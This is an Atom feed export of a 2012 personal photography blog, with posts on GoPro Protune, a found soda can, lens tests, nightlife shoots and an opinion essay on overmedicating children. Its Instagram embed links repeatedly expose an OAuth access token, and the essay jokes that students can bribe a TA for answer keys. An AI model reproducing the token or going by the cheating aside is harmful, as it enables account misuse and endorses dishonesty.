<p>After this experience, I can say I do have more of an appreciation for what full-time wedding shooters do. It&#8217;s a tough job, even if you know the people involved. Would I get into wedding photography full-time? Well, only if I could get a gig like this past one on a regular basis. I&#8217;m not too sure if I&#8217;d be down for a full-on church-and-500-family-members-and-freeloaders style ceremony.</p>

<p>But, more importantly, congrats once again to Talmage and Erick. You guys rock. I&#8217;ll have your custom site and edits sorted probably around the time you get in from Captiva&#8230;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GoPro has had a busy week...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/17/gopro-has-had-a-busy-week-dot-dot-dot/"/>
    <updated>2012-10-17T10:32:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/17/gopro-has-had-a-busy-week-dot-dot-dot</id>
    <content type="html"><![CDATA[<iframe src="http://player.vimeo.com/video/51601636?title=1&amp;byline=1&amp;portrait=1" width="720" height="480" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<p> <p><a href="http://vimeo.com/51601636">• GoPro Hero 2 Protune Test - Nighttime Drive •</a> from <a href="http://vimeo.com/dvdigital">Dan V</a> on <a href="http://vimeo.com">Vimeo</a>.</p></p>

<p>The fine folks at GoPro have had a busy week. For existing owners of the Hero2, they released a new firmware set, which included a new set of shooting modes collectively grouped under the name &#8216;Protune&#8217;. Protune basically doubles the bitrate of the GoPro&#8217;s recorded files to 35 Mbps, and produces a more &#8216;flat&#8217; file with no in-camera color corrections or sharpening. And, in bigger news, they rolled the GoPro Hero 3 last night, which adds built-in WiFi, 4K video recording (albeit at 15 FPS), all packaged in a smaller-profile body&#8230;</p>

<!-- more -->


<p>However, the Hero 3 just went on sale for pre-order, so I obviously don&#8217;t have one on hand yet. I was this &#8220;&lt;>&#8221; close to buying a Hero 2, but fortunately I didn&#8217;t. I have the wedding of my great friends and neighbors Tal and Erick to shoot this weekend up in North Carolina, and I wanted to strap a GoPro next to the &#8220;altar&#8221; and record the vows portion from an alternate angle, so I was going to pull the trigger and buy a Hero 2. Fortunately, time kind of ran out on me, so I had to make do with borrowing <a href="http://weekendweapons.com/">Travis&#8217;</a> Hero 2. I told him I&#8217;d upgrade it to the Protune firmware while I was at it.</p>

<p>So, with that in mind, I figured I&#8217;d take Protune for a spin.</p>

<p><a href='http://www.dan-vidal.com//blog/2012/10/16//' data-instagram-url='http://instagr.am/p/Q3gj9EggEx/' class='instagram-image'><img src='http://distilleryimage5.s3.amazonaws.com/a2921adc180511e2a46d1231381b4837_7.jpg' alt='A #protune test of @gopro !' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.835181305,-80.182557106'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835181305,-80.182557106&markers=25.835181305,-80.182557106&zoom=14&size=612x200&sensor=false' alt='Talk Nightlife' /></a><br/>Taken at Talk Nightlife</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='303854708114719025_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>I strapped the Hero 2 to the front left bumper of the 210, and proceeded to record my drive down to Blue Martini in Brickell for my &#8220;Tuesday Tradition&#8221; shooting session over at Jive With The Band.</p>

<p>You can see the results above, and judge for yourself. I did some basic color correction and exposure adjustment in Final Cut Pro X, and exported this to Vimeo via Compressor 4 using the standard Vimeo preset.</p>

<p>The unaltered video out of the camera is very noisy. This was to be expected, since Protune deactivates all in-camera processing, including noise reduction. It&#8217;s about as close to RAW video as you are likely to get out of something in the class of the GoPro. Colors were very neutral and flat. The dynamic range was increased, due to the &#8220;flat&#8221; nature of the file. At first glance, it actually appeared to be worse than the previous firmware output.</p>

<p>However, this was the expected result. Ideally, if you can&#8217;t get true RAW output out of your camera, you want a file that is as untouched and as uncompressed as possible, to allow for these adjustments to be made with more precise tools present on your laptop. Which is exactly what Protune accommodates, as much as possible. Also, it does reveal the limitations of the tiny sensor in the camera. It&#8217;s a noisy mess, and GoPro is definitely to be commended for developing decent in-camera noise reduction and sharpening techniques for their standard firmware. FYI, you can turn Protune off and go back to the standard modes at any time.</p>

<p>That being said, for anyone remotely interested in video, I don&#8217;t recommend it. You can really make the output of the GoPro shine with Protune, using your choice of post-production software, whether it&#8217;s Final Cut Pro X, or GoPro&#8217;s own Cineform. Once you understand the purpose of Protune, it is definitely a winner. It gets the camera&#8217;s ideas about things out of the way of your workflow, and lets you make the decisions on color correction, sharpening, noise, and so on.</p>

<p>For a $300 unit, the GoPro Hero 2 with Protune is a winner in my book. I&#8217;ll be doing some daylight tests today and tomorrow, which I will post about soon thereafter.</p>

<p>As for the Hero 3? That will most likely make it into my bag in short order. GoPro, if you pick this up, I&#8217;m always game to beat around a demo unit.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[It is like my version of Mr Sparkle.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/13/my-version-of-mr-sparkle/"/>
    <updated>2012-10-13T18:19:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/13/my-version-of-mr-sparkle</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/niceday-1479.jpg" width="640" height="960" title="'Mirinda'" ></p>

<p>It was a positively stunning day here in South Florida, so I jumped in the 210 and went out for a bit.</p>

<!-- more -->


<p>I made my usual Saturday stop at Whole Foods, this time the South Beach one. The Aventura one has better wraps, but the Beach one is closer, and I wanted to shoot some random stuff on the Beach anyways.</p>

<p>After my tuna wrap, I proceeded up Collins to the Ocean Terrace around 74th Street. I figured I&#8217;d try to get some shallow DOF shots out on the sand. I was experimenting with trying to capture one breaking wave, when an orange can thumped into my foot.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/niceday-1476.jpg" width="960" height="640" title="'Mirinda'" ></p>

<p>&#8220;Mirinda?&#8221; I thought, &#8220;What the hell is Mirinda?&#8221;</p>

<p>It&#8217;s a girl&#8217;s name in some quarters, but I never saw it applied to a beverage. So, curious, I picked up the can. It was unopened, and aside from the Mirinda logo, it lacked the usual nutritional value grid, and also the volume was listed as 330 mL only. No Imperial measurements. My god, it&#8217;s a can from the future!</p>

<p>It was totally my Mr Sparkle moment.</p>

<iframe width="420" height="315" src="http://www.youtube.com/embed/dnaLRbbc-54" frameborder="0" allowfullscreen></iframe>


<p>But, my momentary flashback to a Simpsons episode faded, and it turns out Mirinda is a product of Pepsi, primarily distributed in Asia. The can actually said &#8220;Distributed by Pepsi Singapore&#8221; on the side.</p>

<p><a href='http://www.dan-vidal.com//blog/2012/10/13//' data-instagram-url='http://instagr.am/p/QvBo3qggAv/' class='instagram-image'><img src='http://distilleryimage3.s3.amazonaws.com/e3132586156e11e283e622000a1fb86d_7.jpg' alt='This must have fallen off of a ship. #mirinda #singapore @norahlovesmakeup_mua idea? This is in Miami Beach.' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/hudson'>Hudson</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.86046311,-80.1200069'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.86046311,-80.1200069&markers=25.86046311,-80.1200069&zoom=14&size=612x200&sensor=false' alt='Maracas Place' /></a><br/>Taken at Maracas Place</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='301466906651656239_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>I&#8217;m guessing it probably fell off of a passing cargo freighter, which most likely took on provisions in the port of Singapore. There&#8217;s an ever so slight chance it washed up from further away, but most likely it is the boring explanation.</p>

<p>This was totally my Mr Sparkle moment though.</p>

<p>Now, the can is still sealed, so in theory the beverage should be consumable. It&#8217;s in my fridge right now. I don&#8217;t drink soda anymore though&#8230;</p>

<p>Oh, and I&#8217;m totally loving how things look at 1.2 during broad daylight. Very surreal.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Someone summed it up eloquently...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/13/someone-summed-it-up-eloquently-dot-dot-dot/"/>
    <updated>2012-10-13T03:35:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/13/someone-summed-it-up-eloquently-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/jordyn-6643.jpg" width="960" height="640" title="'It fell in line...'" ></p>

<p>While some tell me my strength lies in capturing images, I also have been told I can write well. However, in terms of writing, I do tend to ramble. Hence, this blog&#8217;s tagline having the words &#8220;general ramblings&#8221;&#8230;</p>

<p>So, when someone asks for me to summarize something, it&#8217;s nigh-impossible for me to do. So, if you asked me to sum up my own body of photographic work, I&#8217;d be at a loss to condense it to a sentence or two. I cringe at committing grammar crimes when I have to post to Twitter. The art of summary is lost to me.</p>

<p>However, someone summarized what I do so well for me just a few minutes ago&#8230;</p>

<!-- more -->




<blockquote><p>You have a vision and you wait for the world to fall in line and then you capture it&#8230;</p><footer><strong>Adriana D</strong> <cite>A Phone Conversation 12 October 2012</cite></footer></blockquote>


<p>And <em>boom</em>, that sums it up.</p>

<p>I could sit here for hours expounding on noise levels, a-to-d conversions, electric fields emanating from poorly-shielded cabling, the native ISO of a given sensor, and don&#8217;t-point-your-lens-at-a-10-watt-laser-you-fool type of things and it wouldn&#8217;t be a summary of how I manage to pull off a shot. It&#8217;d be the Book of Pod so to speak. Which, some people like, and some people don&#8217;t.</p>

<p>It actually speaks volumes about having an outside opinion.</p>

<p><a href='http://www.dan-vidal.com//blog/2012/10/13//' data-instagram-url='http://instagr.am/p/QtZ7SrAgIA/' class='instagram-image'><img src='http://distilleryimage0.s3.amazonaws.com/4906bc4c14f011e2bacf123138179cfe_7.jpg' alt='You can see the guy about to jump out.' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.82752892,-80.187165969'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.82752892,-80.187165969&markers=25.82752892,-80.187165969&zoom=14&size=612x200&sensor=false' alt='55th Street Station' /></a><br/>Taken at 55th Street Station</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='301010775764500992_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>I had just come back from a nighttime run (yes Ryan, I do run around this neighborhood at 1 AM) and I picked up a text conversation where I had left it off earlier. My friend Adriana had just moved from the construction mess called Brickell, to a cozy new joint on Collins Avenue in &#8220;Condo Canyon&#8221; with her boyfriend. She was inviting me over for a little housewarming thing tomorrow, and she mentioned the last thing she had picked up from her old apt was a piece of mine that she purchased back in 2009:</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/frances_2008.jpg" width="640" height="960" title="'Frances at Space - 2008'" ></p>

<p>I had done an exhibit of some of my &#8220;dancer photos&#8221; at the first <a href="http://lifeisart.org">Life Is Art</a> exhibit in Wynwood. Life is Art, by <a href="http://soulofmiami.org">Soul of Miami</a> founder James Echols, is a local organization that supports up-and-coming artists of all stripes. Since that first open show in 2009, they&#8217;ve come a long way and are quite renowned in the art community, especially amongst artists who may not be &#8220;hip&#8221; enough to warrant the attention of some of the more corporate art organizations in town. Adriana, at the time, was their treasurer, and had expressed an interest in obtaining a print of one of my images, specifically the one above. So, her mom took it upon herself to pull me aside and purchase it from me for her. As my exhibit was digital (I didn&#8217;t have the budget to produce 20 prints of size), I took the &#8220;order&#8221; and contacted my print provider to generate a canvas-framed print for me of this piece. A few weeks later, it was delivered to Adriana, to much acclaim. Oddly enough it&#8217;s the only &#8220;dancer&#8221; piece I have ever sold. Either I just haven&#8217;t marketed them properly or people don&#8217;t go for half-naked girls in smoky nightclubs as <em>objets d&#8217;art</em>.</p>

<p>Fast-forward to today. As pieces of art are often delicate, they are usually transported separately from other items in a moving adventure. Anyways, in a conversation about that piece tonight, Adriana was asking me about how I capture moments like that, and I did have a hard time summarizing it up. So, she put it into words that had previously escaped me:</p>

<blockquote><p>You have a vision and you wait for the world to fall in line and then you capture it&#8230;</p><footer><strong>Adriana D</strong> <cite>A Phone Conversation 12 October 2012</cite></footer></blockquote>


<p>And yes, that&#8217;s it. Minus the technical details, which, if anyone asks, I&#8217;ll gladly explain, that&#8217;s pretty much it. I see the image in my head, and I wait for the world to fall in line. Whether it&#8217;s in a club or below a deserted bridge in Key West, that&#8217;s it. If I had to sum it up into a Twitter-friendly sentence, that is it.</p>

<p>Now, if I can summarize this post, it would be, &#8220;A different perspective always helps&#8230;&#8221;</p>

<p>Oh, and Ade, thanks!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Shooting video wide open.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/10/shooting-video-wide-open/"/>
    <updated>2012-10-10T12:41:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/10/shooting-video-wide-open</id>
    <content type="html"><![CDATA[<iframe src="http://player.vimeo.com/video/51143544" width="720" height="480" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<p> <p><a href="http://vimeo.com/51143544">• 50 1.2 L video test wide open at 1.2 •</a> from <a href="http://vimeo.com/dvdigital">Dan V</a> on <a href="http://vimeo.com">Vimeo</a>.</p></p>

<p>Shooting video using the 50 1.2 L is an interesting experience, to say the least&#8230;</p>

<!-- more -->


<p>One of the biggest things cinematographers and videographers, such as <a href="http://watcha3.com/">Buster</a> over at A3, have conveyed to me, is the desire to shoot at the lowest ISO possible when shooting video, preferably below ISO 1000, though I have gotten great results at ISO 1600, and I&#8217;ll go beyond that, if I know the video is going to be laden with effects in post.</p>

<p>That being said, the obvious requirement to shoot at a low ISO is, lots of light. And &#8220;lots of light&#8221; in the video world, means something a bit different than in the world of still photography, for a few reasons.</p>

<p>First off, due to the nature of video, you are limited to a shutter speed, at the low end, of 1/30 second. Though, for the best results, most videographers, including <a href="http://blog.vincentlaforet.com">Vincent Laforet</a>, recommend a shutter speed of 1/50 second, to mesh better with common monitor refresh rates. So, almost by default, you are limited in your light gathering ability, when shooting video.</p>

<p>At that point, your options are, crank the ISO, open up as fast as your lens can go, or dump a lot of light on the scene. Or any combination thereof.</p>

<p>As an experiment, I chose to shoot the sequence above at ISO 320, 1/50 second shutter speed, all wide open at f1.2. As you can see, Caroline drifts in and out of the zone of critical focus on numerous occasions. However, the video quality is amazing. At ISO 320, the 5D MK II generates superb results. In reality I could have stopped down a bit, since the lighting tech at Blue Martini was kind enough to have the system running at maximum intensity at the time.</p>

<p>I can definitely recommend the 50 1.2 L for video work. It&#8217;s a very versatile prime, and the image quality is amazing.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[On mental instability...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/10/on-mental-instability-dot-dot-dot/"/>
    <updated>2012-10-10T02:38:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/10/on-mental-instability-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/lostios2012-9070.jpg" width="960" height="640" title="'The crazy ones.'" ></p>

<p>An article in the New York Times caught my eye today, on the subject of <a href="http://www.nytimes.com/2012/10/09/health/attention-disorder-or-not-children-prescribed-pills-to-help-in-school.html?_r=1&partner=rss&emc=rss&smid=tw-nytimes">medicating the children of our society</a> for a range of supposed mental illnesses.</p>

<p>Now, I don&#8217;t condemn the benefits of modern medicine, and I also don&#8217;t condemn the use of drugs recreationally. However, as odd as it may sound with this stance, I&#8217;m actually kind of against the overprescription of psychotropic medications.</p>

<p>For several reasons&#8230;</p>

<!-- more -->




<blockquote><p>We’ve decided as a society that it’s too expensive to modify the kid’s environment. So we have to modify the kid.</p><footer><strong>Alan Schwarz interviews Dr Michael Anderson</strong> <cite><a href='http://www.nytimes.com/2012/10/09/health/attention-disorder-or-not-children-prescribed-pills-to-help-in-school.html?_r=1&partner=rss&emc=rss&smid=tw-nytimes'>Attention Disorder or Not, Pills to Help in School</a></cite></footer></blockquote>


<p>I&#8217;m not an educational professional. I&#8217;ve been told I can convey knowledge rather effectively, but educational techniques are not in any of my various professional and non-professional job descriptions.</p>

<p>Be that as it may, I do pay attention to trends in society with regards to the educational methods being used to teach children today. And, frankly, the trend of medicating children this way scares me.</p>

<p>Objectively, it&#8217;s lazy. The educators lack the patience to effectively deal with the children, so they fall back on a pharmaceutical solution. Now, I&#8217;ll grant you that there may be children who genuinely need these medications just to function in daily life, but from the article above, it seems to reflect the now-obvious trend of seeing a pharmaceutical solution as a way out.</p>

<blockquote><p>On the Rocafort family’s kitchen shelf in Ball Ground, Ga., next to the peanut butter and chicken broth, sits a wire basket brimming with bottles of the children’s medications, prescribed by Dr. Anderson: Adderall for Alexis, 12; and Ethan, 9; Risperdal (an antipsychotic for mood stabilization) for Quintn and Perry, both 11; and Clonidine (a sleep aid to counteract the other medications) for all four, taken nightly.</p><footer><strong>Alan Schwarz</strong> <cite><a href='http://www.nytimes.com/2012/10/09/health/attention-disorder-or-not-children-prescribed-pills-to-help-in-school.html?_r=1&partner=rss&emc=rss&smid=tw-nytimes'>www.nytimes.com/2012/10/09/&hellip;</a></cite></footer></blockquote>


<p>I would call it a statistical norm if one of the children in the family described here required medicating, but when each and every child is on a spectrum of psychotropic drugs, there&#8217;s clear evidence to suggest overprescription is at work here. Nevermind what Mom and Dad might be on.</p>

<blockquote><p>To help me focus on my school work, my homework, listening to Mom and Dad, and not doing what I used to do to my teachers, to make them mad,” he said. He described the week in the hospital and the effects of Risperdal: “If I don’t take my medicine I’d be having attitudes. I’d be disrespecting my parents. I wouldn’t be like this.</p><footer><strong>Alan Schwarz interviewing Quintn Rocafort, age 11</strong> <cite><a href='http://www.nytimes.com/2012/10/09/health/attention-disorder-or-not-children-prescribed-pills-to-help-in-school.html?_r=1&partner=rss&emc=rss&smid=tw-nytimes'>www.nytimes.com/2012/10/09/&hellip;</a></cite></footer></blockquote>


<p>Listen, when I was 11, I was a disrespectful little shit. I regularly threw fits, pissed off my parents and teachers, and didn&#8217;t have that many friends. Yeah, some things never change. However, I was usually lumped in, in terms of intelligence, with the &#8220;gifted&#8221; children, and the school (which was not well-funded!), sought out non-pharmaceutical solutions to my supposed problems. Now, this was the 1980s, so most of the drugs being prescribed to kids these days didn&#8217;t exist, or if they did, it was never considered that they should be given to an 11 year-old child. Basically, the general gist in my case was &#8220;he&#8217;ll grow out of it&#8221;, or &#8220;If he keeps it up, someone will set him straight&#8221;.</p>

<p>However, at no time were my supposed issues considered abnormal or irregular. If anything, the most my parents and teachers did was channel the energy into different areas where my spontaneity would be maximized. A child today who acted like I did, would be force-fed Adderall and told to get back to crunching away at math.</p>

<p>Joking and humor aside though, I managed to get through it and make the most of my mental attributes. I&#8217;ve never been to a therapist, and I&#8217;ve never been on a psychotropic regimen (I took Adderall once and it made me sick), and I manage to pay the bills, maintain a home, and have a social life inside and outside of my work. In other words, I&#8217;m in the ballpark with regards to most statistical norms in American society.</p>

<p>That being said, I do recognize my own mental quirks. I can&#8217;t focus on something for more than ten or fifteen minutes at a time. My mind is always on fire in twenty different directions at once. Only if something truly engages me, can I get around this. For example, I can &#8220;zone out&#8221; and shoot for hours on end. I can write on subjects that interest me without deviating from the task. However, even with tasks I find pointless or uninteresting, if they need to get done, I&#8217;ll get around to doing it by the time it needs to be completed. Usually.</p>

<p>I have a vague notion of time, and I question 95 percent of what crosses my path, so to speak. I&#8217;ll deviate and spend an hour arguing with someone on how pointless something is. For example, a pet peeve of mine is people who take a hour to make a mundane decision, like, what to eat for lunch. My take on lunch or any meal is, &#8220;eat it and move on to the next thing&#8230;&#8221;, since in my head, there&#8217;s other things way more interesting than food. Give me a reasonably-healthy buffet or salad-bar style setup. I&#8217;d rather spend the time multitasking, i.e. I can eat and bang out a blog article, edit some photos, optimize some code, or be social. Food goes in one way, and it comes out another. Whoopee. I&#8217;m sure every foodie in town will want to kill me now.</p>

<p>I also have a hard time bringing people into my inner circle. I&#8217;m severely paranoid around new people. Though is it paranoia if they really are out to get you? But, with time, I&#8217;ll bring people into the circle. Otherwise I&#8217;m pretty a pretty cold customer. Those who know me know the whole &#8220;sunglasses and &#8216;I am smiling&#8217; &#8221; routine.</p>

<p><a href='http://www.dan-vidal.com//blog/2012/09/30//' data-instagram-url='http://instagr.am/p/QNmbQuAgJE/' class='instagram-image'><img src='http://distilleryimage0.s3.amazonaws.com/8b20b1280b3b11e2839c1231381b6c7e_7.jpg' alt='I am smiling.' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/lo-fi'>Lo-fi</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.849085,-80.15046864'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.849085,-80.15046864&markers=25.849085,-80.15046864&zoom=14&size=612x200&sensor=false' alt='Atlantic Broadband' /></a><br/>Taken at Atlantic Broadband</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='292058549993996868_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>Sidebar: I had to deviate from writing this article to derive the media_id of that Instagram photo. It took a minute or two since I saw something that caught my eye along the way. Which made me think of something else, a way of getting that ID without having to kick the Instagram API. Which brings me to my point.</p>

<p>My point is, is that my mental quirks make me who I am. I&#8217;m a paranoid, random sort of guy who can&#8217;t focus on things for long periods of time and I&#8217;m always going off in twenty different directions at once. But, I believe it is those aspects of my personality which enable my creativity and ingenuity. If my parents, or later on, I myself, chose to medicate those quirks away, what would be left?</p>

<p>Basically another BlackBerry-wielding drone in the machine, in my opinion.</p>

<p>Listen, I&#8217;m no revolutionary. I fill out the forms when I have to, and I have &#8220;normal&#8221; things like bills and household chores and so forth. My life is actually pretty mundane sometimes. Though the point is, I was never medicated or told outright to stop acting a certain way. I figured it out as I went along, and I manage to maintain a semblance of a healthy existence, while still retaining the characteristics which make me who I am. All without the modifying effects of psychotropic medications.</p>

<p>And yes, I&#8217;m well aware that just about any substance consumed could be considered a mood-altering substance, but I&#8217;m certainly not dependent on any of them. I love my energy drinks but I don&#8217;t require them to stay ahead. I&#8217;ll get through the day. Comparing a Red Bull to an Adderall regimen is like comparing a 9mm round to a cluster bomb unit though. Same idea (boom), but a huge degree of difference in said boom.</p>

<p>Plus, beyond the poorly-understood detrimental health effects upon the children of our society caused by these substances, it&#8217;s coaching society into a habit of medicating our mental quirks away. Already, there&#8217;s generations of people my age and older who regularly medicate themselves to &#8220;stay ahead&#8221;, and &#8220;stay competitive&#8221;. And these habits are passed down to their children. In the pursuit of the almighty dollar, people drop a panoply of psychotropic medications on a scale to make the ghost of Elvis envious. College students deal in pharmaceuticals just to get that A on the final. Here&#8217;s a clue on that, hotshot, the answers are usually found rather easily, and cheaper than scoring some of Merck&#8217;s finest. Yes, I&#8217;m saying that you can pay off a TA to get the answer key, pretty much.</p>

<p>Now, don&#8217;t get me wrong, I&#8217;m not condemning modern medicine. If I get shot or otherwise grievously injured, I want the best technology that the medical field can provide to patch me up and make me better. I&#8217;m just not so sure we should be medicating away our supposed mental quirks, since it seems that we, as a society, are bent on numbing and erasing the individual features of our psyche that make each and every one of us unique. Do we really all want to be on this statistical norm? Is the goal in life to tap away at Excel spreadsheets all day under the harsh glare of fluorescent lights? The paranoid part of me says that the overmedication of society is conditioning for just that. A pseudo-state of complacency found in pill form. Blissful ignorance, if you will.</p>

<p>Sure, society needs fiends tapping away at Excel and crunching numbers, but you know what? I&#8217;ve met people, whom I consider crazy, who legitimately get off on that sort of thing. Enough that even without medication, there&#8217;s plenty of people who are motivated by their own personal thrill of solving a complex statistical problem in order to better optimize the interest rate on someone&#8217;s savings account. There&#8217;s enough &#8220;natural&#8221; accountants out there, is what I am getting at. I think we&#8217;re all capable of harnessing our own mental quirks to our benefit, and neither we, nor our children, need to be doped up on Adderall all the time.</p>

<p>And, it&#8217;s the crazy ones (yes, I know, I know, we&#8217;ve all seen the old Apple ads&#8230;) who are usually moving things forward for us as a society. Einstein wore the same outfit every day. Steve Jobs was a tyrant and yelled at people a lot, Leonardo was borderline anti-social, Van Gogh cut off his own ear. But these people left lasting positive impressions on society. If they had been medicated into submission, where would we be?</p>

<p>The long-term effects, beyond the physical, are that we are merely medicating away the effects of a sick society. We&#8217;re not getting at the root causes of the pressure to use these medications, we&#8217;re just merely masking the symptoms.</p>

<p>I&#8217;m not here to condemn anyone&#8217;s use of any drug, legal or otherwise. It&#8217;s your body, it&#8217;s your choice. Just consider that you may be snuffing out what makes you unique in this world. I might be a whirlwind of random ramblings and crackpot schemes, but that&#8217;s what makes me who I am. If I adhere to a statistical norm and toe the party line all the time, there&#8217;s really no point in me, as a unique individual, in sticking around. And that, my dear small audience, is a fate worse than death.</p>

<p>Footnote: I&#8217;m not a medical professional, either. I&#8217;m just calling it like I see it.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ramblings after the weekend...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/08/ramblings-after-the-weekend-dot-dot-dot/"/>
    <updated>2012-10-08T23:42:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/08/ramblings-after-the-weekend-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/lostios2012-9386.jpg" width="960" height="640" title="'Still here at 9 AM?'" ></p>

<p>It was one of those random &#8220;on and off&#8221; weekends.</p>

<!-- more -->


<p>Much like any other mental factor, creativity seems to have a finite supply of sorts, and can be slow to replenish. Thursday, I shot a scenic I&#8217;m really proud of, the aptly-titled (yes, I&#8217;m totally being narcissistic here) &#8220;Where The Buses Don&#8217;t Run&#8221;.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/outwhere_rev-8882.jpg" width="960" height="640" title="'US 27 Northbound Broward County'" ></p>

<p>I did this on a Thursday night/Friday morning, and I did the editing and &#8220;mastering&#8221; work on Friday. When I intend to sell a print, I tend to nitpick. I&#8217;ll obsess over minute color corrections, lens flares, and wish for things like my print provider accepting TIFF uploads on the off chance there&#8217;s some minor compression artifacts which could be visible at a large enough print size.</p>

<p>Oh, and by the way, &#8220;Out Where The Buses Don&#8217;t Run&#8221; is for sale on my <a href="http://dan-vidal.fineartamerica.com/">Fine Art America</a> site, along with eight other pieces I consider potential sellers. I&#8217;m getting more and more into shooting nighttime scenics. Though I could do without the bugs in the Everglades. There was a mosquito in the 210 on my way home that night. The hardest part was concentrating on keeping steady at 130 km/h while hoping the little bastard would just go away. I did the &#8220;open all windows and go even faster&#8221; trick and that seemed to help.</p>

<p>That being said, I was fully intent on going back out to shoot more scenics on Friday, but that actually never panned out. I couldn&#8217;t think of a location to scope out. I might try west this week, now that I think about it.</p>

<p>Saturday was my usual club night over at <a href="http://clubspace.com/">Space</a>. Two of my favorites, Chus + Ceballos, were on hand to provide an extended musical soundtrack to the evening. These guys &#8220;get it&#8221;, they know they are there to keep the crowd moving, and they provide an excellent musical selection over the course of ten or more hours on the decks. Great guys in person, too. They&#8217;re always game for the photo op, and they actually love to meet their fans. They <a href="http://www.dan-vidal.com/blog/2012/09/06/the-musical-ecosystem/">know their place in the musical ecosystem</a>.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lostios2012-9091.jpg" width="960" height="640" title="'That Nikon is like a periscope'" ></p>

<p><a href='http://www.dan-vidal.com//blog/2012/10/08//' data-instagram-url='http://instagr.am/p/QiwaZHAgNP/' class='instagram-image'><img src='http://distilleryimage3.s3.amazonaws.com/5be1081a11b011e2aeda22000a1de2e0_7.jpg' alt='Los Tios @chuslesteban @clubspacemiami @jhartlein @ppod @travisrogersmia More at http://seenightlife.com/users/pod/albums/chus-and-ceballos-return-to-space#5' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.784715407,-80.193181247'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.784715407,-80.193181247&markers=25.784715407,-80.193181247&zoom=14&size=612x200&sensor=false' alt='Club Space' /></a><br/>Taken at Club Space</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='298013445259920207_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


